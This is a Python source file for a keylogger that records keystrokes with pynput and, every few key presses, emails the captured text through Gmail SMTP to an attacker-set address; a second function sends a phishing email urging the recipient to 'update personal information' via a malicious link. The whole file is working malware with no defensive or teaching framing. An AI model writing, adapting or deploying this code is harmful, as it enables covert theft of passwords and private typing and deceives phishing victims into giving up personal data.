import pynput
import smtplib
import ssl
from pynput.keyboard import Key, Listener

count = 0
keys = []
phis_count = 0

def phis_mail():
    # Setup port number and server name
    smtp_port = 587                 # Standard secure SMTP port
    smtp_server = "smtp.gmail.com"  # Google SMTP Server

    email_from = "email_sender@gmail.com" #Replace with your sender email
    email_to = "target_user@gmail.com" #Replace with your reciever email

    pswd = "" #App password
    subject = "Important Update"
    message = """Dear User, we require you to update your personal information immediately. Click here: website_with_malicious_content.com"""
    # content of message
    email_message = f"Subject: {subject}\n\n{message}"  

    # Create context
    simple_email_context = ssl.create_default_context()

    try:
        # Connect to the server
        print("Connecting to server...")
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls(context=simple_email_context)
        TIE_server.login(email_from, pswd)
        print("Connected to server :-)")
    
        # Send the actual email
        print()
        print(f"Sending email to - {email_to}")
        TIE_server.sendmail(email_from, email_to, email_message)
        print(f"Email successfully sent to - {email_to}")

    # If there's an error, print it out
    except Exception as e:
        print(e)

    # Close the port
    finally:
        TIE_server.quit()
    
def send_email(message):
    if phis_count ==0: #can use a logic at this place
        phis_mail()
        phis_count+=1
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "sender_email@gmail.com"  # Replace with your sender email
    password = ""  # Replace with your sender email password
    receiver_email = "receiver_email@gmail.com"  # Replace with the receiver's email

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)

    except Exception as e:
        print(e)
    finally:
        server.quit()


def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key == "Key.backspace":
            k = " Backspace "
        elif key == "Key.enter":
            k = " Enter "
        elif key == "Key.shift":
            k = " Shift "
        elif key.find("Key") > 0:
            k = ""
        message += k
    send_email(message)


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
